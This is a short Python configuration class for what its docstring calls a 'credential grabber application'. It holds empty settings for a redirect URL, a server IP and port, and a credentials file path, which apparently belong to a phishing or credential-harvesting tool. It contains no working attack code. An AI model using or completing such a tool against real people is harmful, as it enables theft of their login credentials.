# -*- coding: utf-8 -*-
from __future__ import absolute_import


class ConfigManager(object):
    """
    This class is where configuration for the credential grabber application resides.
    """

    REDIRECT_URL = None
    REDIRECT_METHOD = None
    REDIRECT_TITLE = None

    SERVER_IP = None
    SERVER_PORT = None

    CREDENTIALS_FILE_PATH = None

    LOG_LEVEL = None
